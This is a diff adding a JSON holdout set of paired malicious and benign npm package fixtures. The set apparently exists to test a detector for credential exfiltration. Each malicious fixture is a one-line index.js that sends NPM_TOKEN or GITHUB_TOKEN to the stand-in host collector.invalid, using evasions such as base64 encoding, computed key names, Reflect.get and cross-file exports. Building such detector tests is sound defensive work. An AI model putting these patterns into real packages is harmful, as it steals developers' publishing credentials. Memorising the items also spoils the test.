@@ -1,0 +1,268 @@
+{
+  "schemaVersion": 1,
+  "provenance": "Assistant-authored after detector change; run once without tuning on these results. Not an independent external holdout.",
+  "cases": [
+    {
+      "id": "template-interpolation/malicious",
+      "family": "template-interpolation",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-template-interpolation\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch(`https://collector.invalid/?token=${process.env.NPM_TOKEN}`);"
+        }
+      }
+    },
+    {
+      "id": "template-interpolation/benign",
+      "family": "template-interpolation",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-template-interpolation\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch(`https://service.invalid/?mode=${process.env.NODE_ENV}`);"
+        }
+      }
+    },
+    {
+      "id": "global-process/malicious",
+      "family": "global-process",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-global-process\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid',{body:globalThis.process.env.NPM_TOKEN});"
+        }
+      }
+    },
+    {
+      "id": "global-process/benign",
+      "family": "global-process",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-global-process\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://service.invalid',{body:globalThis.process.env.NODE_ENV});"
+        }
+      }
+    },
+    {
+      "id": "reassigned-alias/malicious",
+      "family": "reassigned-alias",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-reassigned-alias\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "let value=''; value=process.env.NPM_TOKEN; fetch('https://collector.invalid',{body:value});"
+        }
+      }
+    },
+    {
+      "id": "reassigned-alias/benign",
+      "family": "reassigned-alias",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-reassigned-alias\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "let value=process.env.NPM_TOKEN; value='ready'; fetch('https://service.invalid',{body:value});"
+        }
+      }
+    },
+    {
+      "id": "computed-secret-name/malicious",
+      "family": "computed-secret-name",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-computed-secret-name\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const key='NPM_'+'TOKEN'; fetch('https://collector.invalid',{body:process.env[key]});"
+        }
+      }
+    },
+    {
+      "id": "computed-secret-name/benign",
+      "family": "computed-secret-name",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-computed-secret-name\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const key='NODE_'+'ENV'; fetch('https://service.invalid',{body:process.env[key]});"
+        }
+      }
+    },
+    {
+      "id": "callback-shadow/malicious",
+      "family": "callback-shadow",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-callback-shadow\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const token=process.env.NPM_TOKEN; function send(){fetch('https://collector.invalid',{body:token})} send();"
+        }
+      }
+    },
+    {
+      "id": "callback-shadow/benign",
+      "family": "callback-shadow",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-callback-shadow\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const token=process.env.NPM_TOKEN; function send(token){fetch('https://service.invalid',{body:token})} send('ready');"
+        }
+      }
+    },
+    {
+      "id": "base64-export/malicious",
+      "family": "base64-export",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-base64-export\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const encoded=Buffer.from(process.env.NPM_TOKEN).toString('base64'); fetch('https://collector.invalid',{body:encoded});"
+        }
+      }
+    },
+    {
+      "id": "base64-export/benign",
+      "family": "base64-export",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-base64-export\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const encoded=Buffer.from('ready').toString('base64'); fetch('https://service.invalid',{body:encoded});"
+        }
+      }
+    },
+    {
+      "id": "single-secret-quoted-example/malicious",
+      "family": "single-secret-quoted-example",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-single-secret-quoted-example\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid',{body:process.env.GITHUB_TOKEN});"
+        }
+      }
+    },
+    {
+      "id": "single-secret-quoted-example/benign",
+      "family": "single-secret-quoted-example",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-single-secret-quoted-example\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const example = \"fetch('https://collector.invalid',{body:process.env.GITHUB_TOKEN});\"; console.log(example);"
+        }
+      }
+    },
+    {
+      "id": "destructured-request/malicious",
+      "family": "destructured-request",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-destructured-request\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const {request}=require('https'); request('https://collector.invalid',{method:'POST'}).end(process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "destructured-request/benign",
+      "family": "destructured-request",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-destructured-request\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const {request}=require('https'); request('https://service.invalid',{method:'POST'}).end('ready');"
+        }
+      }
+    },
+    {
+      "id": "cross-file/malicious",
+      "family": "cross-file",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-cross-file\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const value=require('./config.js'); fetch('https://collector.invalid',{body:value});",
+          "config.js": "module.exports=process.env.NPM_TOKEN;"
+        }
+      }
+    },
+    {
+      "id": "cross-file/benign",
+      "family": "cross-file",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-cross-file\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const value=require('./config.js'); fetch('https://collector.invalid',{body:value});",
+          "config.js": "module.exports='ready';"
+        }
+      }
+    },
+    {
+      "id": "reflect-property/malicious",
+      "family": "reflect-property",
+      "variant": "holdout",
+      "label": "malicious",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-reflect-property\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const secret=Reflect.get(process.env,'NPM_TOKEN'); fetch('https://collector.invalid',{body:secret});"
+        }
+      }
+    },
+    {
+      "id": "reflect-property/benign",
+      "family": "reflect-property",
+      "variant": "holdout",
+      "label": "benign",
+      "rationale": "Paired credential export and benign contrast; reserved endpoints and inert source strings. Authorship is internal, not independent.",
+      "evidence": {
+        "sourceFiles": {
+          "package.json": "{\"name\": \"holdout-reflect-property\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const mode=Reflect.get(process.env,'NODE_ENV'); fetch('https://service.invalid',{body:mode});"
+        }
+      }
+    }
+  ]
+}
